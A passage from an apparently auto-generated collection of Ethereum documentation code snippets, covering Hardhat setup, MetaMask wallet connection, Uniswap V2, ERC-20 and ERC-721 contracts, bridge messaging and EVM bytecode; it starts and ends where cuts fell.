fffffffffffffffffffffffffffffffff161415610ac1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180610fde6022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c32576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602581526020018061104e6025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cb8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180610fbb6023913960400191505060405180910390fd5b610cc3838383610fb5565b610d2e81604051806060016040528060268152602001611000602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610dc1816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290610f1a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610edf578082015181840152602081019050610ec4565b50505050905090810190601f168015610f0c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905\n```\n\n----------------------------------------\n\nTITLE: Configuring Hardhat for Ethereum Development in JavaScript\nDESCRIPTION: Configuration file for Hardhat that sets up the development environment with dotenv for environment variables, hardhat-ethers plugin, and network configuration for Goerli testnet deployment.\n\nLANGUAGE: javascript\nCODE:\n```\n/**\n * @type import('hardhat/config').HardhatUserConfig\n */\n\nrequire(\"dotenv\").config()\nrequire(\"@nomiclabs/hardhat-ethers\")\n\nconst { API_URL, PRIVATE_KEY } = process.env\n\nmodule.exports = {\n  solidity: \"0.7.3\",\n  defaultNetwork: \"goerli\",\n  networks: {\n    hardhat: {},\n    goerli: {\n      url: API_URL,\n      accounts: [`0x${PRIVATE_KEY}`],\n    },\n  },\n}\n```\n\n----------------------------------------\n\nTITLE: Cross-Domain Message Authentication in Solidity\nDESCRIPTION: Contains the first security check to verify that messages come from the authorized cross-domain messenger contract. This prevents unauthorized contracts from impersonating the messenger.\n\nLANGUAGE: solidity\nCODE:\n```\n        require(\n            msg.sender == address(getCrossDomainMessenger()),\n            \"OVM_XCHAIN: messenger contract unauthenticated\"\n        );\n```\n\n----------------------------------------\n\nTITLE: Configuring Hardhat with Environment Variables\nDESCRIPTION: Configuration file for Hardhat that sets up the development environment with Ethereum network connections. It uses environment variables from .env file for the API URL and private key.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire('dotenv').config();\n\nrequire(\"@nomiclabs/hardhat-ethers\");\nconst { API_URL, PRIVATE_KEY } = process.env;\n\n/**\n* @type import('hardhat/config').HardhatUserConfig\n*/\nmodule.exports = {\n   solidity: \"0.7.3\",\n   defaultNetwork: \"goerli\",\n   networks: {\n      hardhat: {},\n      goerli: {\n         url: API_URL,\n         accounts: [`0x${PRIVATE_KEY}`]\n      }\n   },\n}\n```\n\n----------------------------------------\n\nTITLE: JSON-RPC Request and Response for eth_newBlockFilter\nDESCRIPTION: Example of creating a filter to notify when new blocks arrive in the Ethereum blockchain, with its JSON-RPC request and response format.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_newBlockFilter\",\"params\":[],\"id\":73}'\n// Result\n{\n  \"id\":1,\n  \"jsonrpc\":  \"2.0\",\n  \"result\": \"0x1\" // 1\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing connectWallet Function in JavaScript for MetaMask Integration\nDESCRIPTION: This function attempts to connect to a MetaMask wallet. It checks if window.ethereum is available, requests account access, and returns an object with the connected address and status message. If MetaMask isn't installed, it prompts the user to install it.\n\nLANGUAGE: javascript\nCODE:\n```\nexport const connectWallet = async () => {\n  if (window.ethereum) {\n    try {\n      const addressArray = await window.ethereum.request({\n        method: \"eth_requestAccounts\",\n      })\n      const obj = {\n        status: \"👆🏽 Write a message in the text-field above.\",\n        address: addressArray[0],\n      }\n      return obj\n    } catch (err) {\n      return {\n        address: \"\",\n        status: \"😥 \" + err.message,\n      }\n    }\n  } else {\n    return {\n      address: \"\",\n      status: (\n        <span>\n          <p>\n            {\" \"}\n            🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n              You must install MetaMask, a virtual Ethereum wallet, in your\n              browser.\n            </a>\n          </p>\n        </span>\n      ),\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Current Wallet Connection Status\nDESCRIPTION: Function that checks if a wallet is already connected to the dApp by querying the Ethereum provider. It returns the connected address and appropriate status message based on the connection state, with error handling for various scenarios.\n\nLANGUAGE: javascript\nCODE:\n```\nexport const getCurrentWalletConnected = async () => {\n  if (window.ethereum) {\n    try {\n      const addressArray = await window.ethereum.request({\n        method: \"eth_accounts\",\n      })\n      if (addressArray.length > 0) {\n        return {\n          address: addressArray[0],\n          status: \"👆🏽 Write a message in the text-field above.\",\n        }\n      } else {\n        return {\n          address: \"\",\n          status: \"🦊 Connect to MetaMask using the top right button.\",\n        }\n      }\n    } catch (err) {\n      return {\n        address: \"\",\n        status: \"😥 \" + err.message,\n      }\n    }\n  } else {\n    return {\n      address: \"\",\n      status: (\n        <span>\n          <p>\n            {\" \"}\n            🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n              You must install MetaMask, a virtual Ethereum wallet, in your\n              browser.\n            </a>\n          </p>\n        </span>\n      ),\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: External Add Liquidity Function Implementation in Solidity\nDESCRIPTION: The implementation of the addLiquidity function that calculates optimal amounts, finds the pair address, transfers tokens, and mints liquidity tokens to the recipient.\n\nLANGUAGE: solidity\nCODE:\n```\n) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) {\n    (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n```\n\n----------------------------------------\n\nTITLE: Removing Liquidity with Permit in Uniswap V2\nDESCRIPTION: Enables meta-transactions for removing liquidity by using ERC-2612 permits. Users can authorize the router to spend their liquidity tokens via signature rather than separate approve transaction, saving gas and improving UX.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint liquidity,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline,\n    bool approveMax, uint8 v, bytes32 r, bytes32 s\n) external virtual override returns (uint amountA, uint amountB) {\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n    uint value = approveMax ? uint(-1) : liquidity;\n    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n    (amountA, amountB) = removeLiquidity(tokenA, tokenB, liquidity, amountAMin, amountBMin, to, deadline);\n}\n\n\nfunction removeLiquidityETHWithPermit(\n    address token,\n    uint liquidity,\n    uint amountTokenMin,\n    uint amountETHMin,\n    address to,\n    uint deadline,\n    bool approveMax, uint8 v, bytes32 r, bytes32 s\n) external virtual override returns (uint amountToken, uint amountETH) {\n    address pair = UniswapV2Library.pairFor(factory, token, WETH);\n    uint value = approveMax ? uint(-1) : liquidity;\n    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n    (amountToken, amountETH) = removeLiquidityETH(token, liquidity, amountTokenMin, amountETHMin, to, deadline);\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a New Trade Listing in ERC-721 Marketplace in Solidity\nDESCRIPTION: Function to open a new trade by placing an item in escrow. The item is transferred from the seller to the contract, a new trade is created with the specified item and price, and an event is emitted.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction openTrade(uint256 _item, uint256 _price)\n  public\n{\n  itemToken.transferFrom(msg.sender, address(this), _item);\n  trades[tradeCounter] = Trade({\n    poster: msg.sender,\n    item: _item,\n    price: _price,\n    status: \"Open\"\n  });\n  tradeCounter += 1;\n  emit TradeStatusChange(tradeCounter - 1, \"Open\");\n}\n```\n\n----------------------------------------\n\nTITLE: EVM Implementation of Token Transfer with Approvals\nDESCRIPTION: This snippet shows the EVM bytecode for a token transfer function with approval mechanism. It includes security checks to ensure valid addresses and manages the token balance state.\n\nLANGUAGE: evm\nCODE:\n```\nPUSH1 0x0 PUSH2 0x59A PUSH2 0x593 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5BB DUP5 DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH2 0x67C DUP5 PUSH2 0x5C7 PUSH2 0x9AD JUMP JUMPDEST PUSH2 0x677 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1026 PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 DUP12 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x62D PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP\n```\n\n----------------------------------------\n\nTITLE: Converting Wei to Ether using Web3.js\nDESCRIPTION: JavaScript code using web3.js to convert a hexadecimal wei amount to ether. This is executed in the Geth console for easier readability of the balance.\n\nLANGUAGE: javascript\nCODE:\n```\nweb3.fromWei(\"0x1639e49bba16280000\", \"ether\")\n// \"410\"\n```\n\n----------------------------------------\n\nTITLE: Calculating and Minting Protocol Fees in Uniswap V2 (Solidity)\nDESCRIPTION: The _mintFee function calculates and mints protocol fees (1/6th of the 0.3% trading fee) when liquidity is added or removed. It tracks k-value changes to determine fees and only mints tokens when the feeTo address is set in the factory contract.\n\nLANGUAGE: solidity\nCODE:\n```\n    // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)\n    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        address feeTo = IUniswapV2Factory(factory).feeTo();\n        feeOn = feeTo != address(0);\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        uint _kLast = kLast; // gas savings\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        if (feeOn) {\n            if (_kLast != 0) {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));\n                uint rootKLast = Math.sqrt(_kLast);\n                if (rootK > rootKLast) {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n                    uint numerator = totalSupply.mul(rootK.sub(rootKLast));\n                    uint denominator = rootK.mul(5).add(rootKLast);\n                    uint liquidity = numerator / denominator;\n```\n\nLANGUAGE: solidity\nCODE:\n```\n                    if (liquidity > 0) _mint(feeTo, liquidity);\n                }\n            }\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        } else if (_kLast != 0) {\n            kLast = 0;\n        }\n    }\n```\n\n----------------------------------------\n\nTITLE: CREATE Opcode in EVM\nDESCRIPTION: Creates a new contract using code from memory and returns the contract address. The new address is calculated using keccak256 hash of the contract address and its nonce.\n\nLANGUAGE: evm assembly\nCODE:\n```\naddr = keccak256(rlp([address(this), this.nonce]))\n```\n\n----------------------------------------\n\nTITLE: Modifying Decimals in ERC-20 Token with Solidity\nDESCRIPTION: The _setupDecimals function modifies the _decimals variable which is used to indicate how the UI should interpret token values. This function should only be called from the constructor to avoid disrupting applications.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _setupDecimals(uint8 decimals_) internal {\n    _decimals = decimals_;\n}\n```\n\n----------------------------------------\n\nTITLE: IL1ERC20Bridge Interface Definition with ERC20DepositInitiated Event\nDESCRIPTION: Defines the beginning of the IL1ERC20Bridge interface with the ERC20DepositInitiated event. This event is emitted when a deposit (transfer from L1 to L2) is initiated for an ERC-20 token.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @title IL1ERC20Bridge\n */\ninterface IL1ERC20Bridge {\n    /**********\n     * Events *\n     **********/\n\n    event ERC20DepositInitiated(\n```\n\n----------------------------------------\n\nTITLE: Implementing onMintPressed Function in React for NFT Minting\nDESCRIPTION: Implements the onMintPressed function that is triggered when a user clicks the mint button in the React frontend. This function calls the mintNFT function with the required parameters and updates the UI status based on the transaction result.\n\nLANGUAGE: javascript\nCODE:\n```\nconst onMintPressed = async () => {\n  const { status } = await mintNFT(url, name, description)\n  setStatus(status)\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing ERC-721 Contract with Constructor in Vyper\nDESCRIPTION: Constructor function that sets up the initial state of the contract, enabling ERC-165 and ERC-721 interfaces and assigning the contract deployer as the minter.\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef __init__():\n    \"\"\"\n    @dev Contract constructor.\n    \"\"\"\n    self.supportedInterfaces[ERC165_INTERFACE_ID] = True\n    self.supportedInterfaces[ERC721_INTERFACE_ID] = True\n    self.minter = msg.sender\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 TransferFrom Function in Solidity\nDESCRIPTION: This function allows a spender to transfer tokens from an owner's account to another address after receiving approval. It handles both the transfer operation and the reduction of the allowance.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * Requirements:\n     *\n     * - `sender` and `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``sender``'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual\n                                                override returns (bool) {\n        _transfer(sender, recipient, amount);\n```\n\n----------------------------------------\n\nTITLE: Implementing Safe NFT Transfer in Vyper\nDESCRIPTION: This function safely transfers an NFT by first checking if the recipient is a contract, and if so, verifying that it implements the necessary receiver interface. It includes an optional data parameter that is passed to the receiver contract.\n\nLANGUAGE: python\nCODE:\n```\n@external\ndef safeTransferFrom(\n        _from: address,\n        _to: address,\n        _tokenId: uint256,\n        _data: Bytes[1024]=b\"\"\n    ):\n    \"\"\"\n    @dev Transfers the ownership of an NFT from one address to another address.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the\n         approved address for this NFT.\n         Throws if `_from` is not the current owner.\n         Throws if `_to` is the zero address.\n         Throws if `_tokenId` is not a valid NFT.\n         If `_to` is a smart contract, it calls `onERC721Received` on `_to` and throws if\n         the return value is not `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`. \n         NOTE: bytes4 is represented by bytes32 with padding\n    @param _from The current owner of the NFT.\n    @param _to The new owner.\n    @param _tokenId The NFT to transfer.\n    @param _data Additional data with no specified format, sent in call to `_to`.\n    \"\"\"\n    self._transferFrom(_from, _to, _tokenId, msg.sender)\n```\n\n----------------------------------------\n\nTITLE: Implementing increaseAllowance for ERC20 in Solidity\nDESCRIPTION: The increaseAllowance function is an OpenZeppelin addition to prevent front-running attacks. It atomically increases the allowance granted to a spender by adding a value to the current allowance using safe math.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Atomically increases the allowance granted to `spender` by the caller.\n *\n * This is an alternative to {approve} that can be used as a mitigation for\n * problems described in {IERC20-approve}.\n *\n * Emits an {Approval} event indicating the updated allowance.\n *\n * Requirements:\n *\n * - `spender` cannot be the zero address.\n */\nfunction increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n    return true;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing transferFrom Function in ERC-721 Vyper Contract\nDESCRIPTION: This function transfers an NFT from one address to another, with proper ownership and authorization checks. It requires the sender to be either the current owner, an approved operator, or the approved address for the specific token.\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef transferFrom(_from: address, _to: address, _tokenId: uint256):\n    \"\"\"\n    @dev Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n         address for this NFT.\n         Throws if `_from` is not the current owner.\n         Throws if `_to` is the zero address.\n         Throws if `_tokenId` is not a valid NFT.\n    @notice The caller is responsible to confirm that `_to` is capable of receiving NFTs or else\n            they maybe be permanently lost.\n    @param _from The current owner of the NFT.\n    @param _to The new owner.\n    @param _tokenId The NFT to transfer.\n    \"\"\"\n    self._transferFrom(_from, _to, _tokenId, msg.sender)\n```\n\n----------------------------------------\n\nTITLE: Implementing _beforeTokenTransfer Hook in ERC-20 Contract\nDESCRIPTION: Basic implementation of the _beforeTokenTransfer hook that overrides the function from the ERC-20 contract. This function is called before any token transfer and allows for custom validation logic.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _beforeTokenTransfer(address from, address to, uint256 amount)\n    internal virtual\n    override(ERC20)\n{\n    super._beforeTokenTransfer(from, to, amount);\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Poseidon Hash and Pack Functions in ZoKrates\nDESCRIPTION: Imports the Poseidon hash function and pack128 utility from the ZoKrates standard library. Poseidon is used for hashing field elements, while pack128 converts 128 boolean values into a field element.\n\nLANGUAGE: zokrates\nCODE:\n```\nimport \"hashes/poseidon/poseidon.zok\" as poseidon;\nimport \"utils/pack/bool/pack128.zok\" as pack128;\n```\n\n----------------------------------------\n\nTITLE: Cross-Chain Message Construction for Withdrawals\nDESCRIPTION: Constructs the message to be sent to L1 for withdrawals, handling the differences between ETH and ERC-20 tokens. The function encodes the appropriate finalization selector based on token type.\n\nLANGUAGE: solidity\nCODE:\n```\n        // Construct calldata for l1TokenBridge.finalizeERC20Withdrawal(_to, _amount)\n        // slither-disable-next-line reentrancy-events\n        address l1Token = IL2StandardERC20(_l2Token).l1Token();\n        bytes memory message;\n\n        if (_l2Token == Lib_PredeployAddresses.OVM_ETH) {\n            message = abi.encodeWithSelector(\n                IL1StandardBridge.finalizeETHWithdrawal.selector,\n                _from,\n                _to,\n                _amount,\n                _data\n            );\n        } else {\n            message = abi.encodeWithSelector(\n                IL1ERC20Bridge.finalizeERC20Withdrawal.selector,\n                l1Token,\n                _l2Token,\n                _from,\n                _to,\n                _amount,\n                _data\n            );\n        }\n\n        // Send message up to L1 bridge\n        // slither-disable-next-line reentrancy-events\n        sendCrossDomainMessage(l1TokenBridge, _l1Gas, message);\n\n        // slither-disable-next-line reentrancy-events\n        emit WithdrawalInitiated(l1Token, _l2Token, msg.sender, _to, _amount, _data);\n    }\n```\n\n----------------------------------------\n\nTITLE: Swap Exact Tokens for Tokens with Fee Support in Uniswap V2\nDESCRIPTION: External function that allows swapping a fixed amount of input tokens for a minimum amount of output tokens, supporting tokens with transfer fees. It transfers the input tokens first, then performs the swap using the fee-supporting internal function.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint amountIn,\n    uint amountOutMin,\n    address[] calldata path,\n    address to,\n    uint deadline\n) external virtual override ensure(deadline) {\n    TransferHelper.safeTransferFrom(\n        path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn\n    );\n    uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);\n    _swapSupportingFeeOnTransferTokens(path, to);\n    require(\n        IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,\n        'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'\n    );\n}\n```\n\n----------------------------------------\n\nTITLE: Using Hook Function Before Token Transfer\nDESCRIPTION: Call to the _beforeTokenTransfer hook function which allows derived contracts to execute logic before transfers. This is a hook pattern that enables extending functionality without modifying the core transfer logic.\n\nLANGUAGE: solidity\nCODE:\n```\n_beforeTokenTransfer(sender, recipient, amount);\n```\n\n----------------------------------------\n\nTITLE: Implementing Pair Contract Constructor in Uniswap\nDESCRIPTION: The constructor for the pair contract that stores the address of the factory that created it. This information is needed for initialization and fee calculations.\n\nLANGUAGE: solidity\nCODE:\n```\nconstructor() public {\n    factory = msg.sender;\n}\n```\n\n----------------------------------------\n\nTITLE: Synchronizing Reserves with Actual Balances\nDESCRIPTION: The sync function updates the internal reserve tracking to match the actual token balances of the contract, useful when tokens are directly transferred to the contract without using the standard functions.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction sync() external lock {\n    _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);\n}\n}\n```\n\n----------------------------------------\n\nTITLE: Explaining Key Derivation Path Components\nDESCRIPTION: Breaks down the hierarchical derivation path into its components, showing how each segment represents a specific element in the key derivation process from master key to individual address.\n\nLANGUAGE: plaintext\nCODE:\n```\nmaster_key / purpose / coin_type / account / change / address_index\n```\n\n----------------------------------------\n\nTITLE: Memory Buffer Reading Implementation with Assembly\nDESCRIPTION: Uses inline assembly to read a 32-byte word from a memory buffer at a specific offset, handling the memory layout of bytes arrays in Solidity.\n\nLANGUAGE: solidity\nCODE:\n```\n    {\n        require(_bytes.length >= _start + 32, \"toUint256_outOfBounds\");\n        uint256 tempUint;\n\n        assembly {\n            tempUint := mload(add(add(_bytes, 0x20), _start))\n        }\n```\n\n----------------------------------------\n\nTITLE: Implementando a função para cunhar NFT com transação Ethereum\nDESCRIPTION: Função completa que cria uma transação Ethereum para cunhar um NFT, incluindo a obtenção do nonce da conta, configuração dos parâmetros da transação e chamada ao método mintNFT do contrato.\n\nLANGUAGE: javascript\nCODE:\n```\n   require('dotenv').config();\n   const API_URL = process.env.API_URL;\n   const PUBLIC_KEY = process.env.PUBLIC_KEY;\n   const PRIVATE_KEY = process.env.PRIVATE_KEY;\n\n   const { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\");\n   const web3 = createAlchemyWeb3(API_URL);\n\n   const contract = require(\"../artifacts/contracts/MyNFT.sol/MyNFT.json\");\n   const contractAddress = \"0x5a738a5c5fe46a1fd5ee7dd7e38f722e2aef7778\";\n   const nftContract = new web3.eth.Contract(contract.abi, contractAddress);\n\n   async function mintNFT(tokenURI) {\n     const nonce = await web3.eth.getTransactionCount(PUBLIC_KEY, 'latest'); //get latest nonce\n\n   //the transaction\n     const tx = {\n       'from': PUBLIC_KEY,\n       'to': contractAddress,\n       'nonce': nonce,\n       'gas': 500000,\n       'data': nftContract.methods.mintNFT(PUBLIC_KEY, tokenURI).encodeABI()\n     };\n   }​\n```\n\n----------------------------------------\n\nTITLE: Preventing Token Transfers to Contract Address\nDESCRIPTION: A require statement that prevents users from sending tokens to the contract's own address, which is a common mistake that leads to permanent loss of tokens.\n\nLANGUAGE: solidity\nCODE:\n```\nrequire(to != address(this), \"Can't send tokens to the contract address\");\n```\n\n----------------------------------------\n\nTITLE: Implementing Token Transfer Function in Solidity ERC-20 Contract\nDESCRIPTION: The _transfer function moves tokens from one account to another. It performs essential checks to ensure sender and recipient addresses are valid and that the sender has sufficient balance. This function is called by both transfer and transferFrom methods.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Moves tokens `amount` from `sender` to `recipient`.\n *\n * This is internal function is equivalent to {transfer}, and can be used to\n * e.g. implement automatic token fees, slashing mechanisms, etc.\n *\n * Emits a {Transfer} event.\n *\n * Requirements:\n *\n * - `sender` cannot be the zero address.\n * - `recipient` cannot be the zero address.\n * - `sender` must have a balance of at least `amount`.\n */\nfunction _transfer(address sender, address recipient, uint256 amount) internal virtual {\n```\n\n----------------------------------------\n\nTITLE: Synchronizing Reserves with Actual Balances\nDESCRIPTION: The sync function updates the internal reserve tracking to match the actual token balances of the contract, useful when tokens are directly transferred to the contract without using the standard functions.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction sync() external lock {\n    _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);\n}\n}\n```\n\n----------------------------------------\n\nTITLE: Getting Reserve Values in Uniswap V2\nDESCRIPTION: Retrieves the current reserves of both tokens in the liquidity pool. The third returned value (timestamp) is discarded as it's not needed in this context.\n\nLANGUAGE: solidity\nCODE:\n```\n(uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n```\n\n----------------------------------------\n\nTITLE: Implementando um Token ERC-20 em Solidity\nDESCRIPTION: Implementação básica de um token ERC-20 com interface IERC20 e contrato base com funções para transferência, aprovação e consulta de saldos. Este contrato servirá como base para a corretora descentralizada.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n\ncontract ERC20Basic is IERC20 {\n\n    string public constant name = \"ERC20Basic\";\n    string public constant symbol = \"ERC\";\n    uint8 public constant decimals = 18;\n\n\n    mapping(address => uint256) balances;\n\n    mapping(address => mapping (address => uint256)) allowed;\n\n    uint256 totalSupply_ = 10 ether;\n\n\n   constructor() {\n    balances[msg.sender] = totalSupply_;\n    }\n\n    function totalSupply() public override view returns (uint256) {\n    return totalSupply_;\n    }\n\n    function balanceOf(address tokenOwner) public override view returns (uint256) {\n        return balances[tokenOwner];\n    }\n\n    function transfer(address receiver, uint256 numTokens) public override returns (bool) {\n        require(numTokens <= balances[msg.sender]);\n        balances[msg.sender] = balances[msg.sender]-numTokens;\n        balances[receiver] = balances[receiver]+numTokens;\n        emit Transfer(msg.sender, receiver, numTokens);\n        return true;\n    }\n\n    function approve(address delegate, uint256 numTokens) public override returns (bool) {\n        allowed[msg.sender][delegate] = numTokens;\n        emit Approval(msg.sender, delegate, numTokens);\n        return true;\n    }\n\n    function allowance(address owner, address delegate) public override view returns (uint) {\n        return allowed[owner][delegate];\n    }\n\n    function transferFrom(address owner, address buyer, uint256 numTokens) public override returns (bool) {\n        require(numTokens <= balances[owner]);\n        require(numTokens <= allowed[owner][msg.sender]);\n\n        balances[owner] = balances[owner]-numTokens;\n        allowed[owner][msg.sender] = allowed[owner][msg.sender]-numTokens;\n        balances[buyer] = balances[buyer]+numTokens;\n        emit Transfer(owner, buyer, numTokens);\n        return true;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing increaseAllowance for ERC20 in Solidity\nDESCRIPTION: The increaseAllowance function is an OpenZeppelin addition to prevent front-running attacks. It atomically increases the allowance granted to a spender by adding a value to the current allowance using safe math.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Atomically increases the allowance granted to `spender` by the caller.\n *\n * This is an alternative to {approve} that can be used as a mitigation for\n * problems described in {IERC20-approve}.\n *\n * Emits an {Approval} event indicating the updated allowance.\n *\n * Requirements:\n *\n * - `spender` cannot be the zero address.\n */\nfunction increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n    return true;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Allowance Tracking in ERC20 Token with Nested Mapping\nDESCRIPTION: This nested mapping tracks token allowances, where one address can authorize another address to spend tokens on their behalf. The first key is the token owner's address, and the second key is the spender's address.\n\nLANGUAGE: solidity\nCODE:\n```\n    mapping (address => mapping (address => uint256)) private _allowances;\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 Token Contract in Solidity\nDESCRIPTION: A full ERC20 token implementation with standard functions including transfer, approve, transferFrom, balanceOf and other required ERC20 interface methods. The contract initializes with token name 'Basic', symbol 'BSC', and decimal places set to 18 (0x12).\n\nLANGUAGE: 